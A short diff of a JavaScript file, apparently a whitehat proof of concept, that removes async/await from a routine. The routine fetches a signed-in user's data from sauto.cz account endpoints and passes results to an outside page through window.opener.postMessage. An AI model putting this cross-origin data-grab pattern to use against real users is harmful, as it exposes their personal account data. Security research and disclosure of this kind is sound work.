@@ -8,11 +8,11 @@ window.addEventListener(
     false,
 );
 
-async function run()
+function run()
 {
     let axios1 = false;
     let axios2 = false;
-    await axios
+    axios
         .get(
             'https://www.sauto.cz/api/v1/users/self',
             {
@@ -31,7 +31,7 @@ async function run()
             window.opener.postMessage({errorString: error.toString()}, 'https://whitehat-email-cz.vercel.app/')
         });
 
-    await axios
+    axios
         .get(
             'https://login.sauto.cz/api/v1/user/badge?service=sauto',
             {
@@ -51,4 +51,4 @@ async function run()
             window.opener.postMessage({errorString: error.toString()}, 'https://whitehat-email-cz.vercel.app/')
         });
 }
-run().then(r => null);
+run()
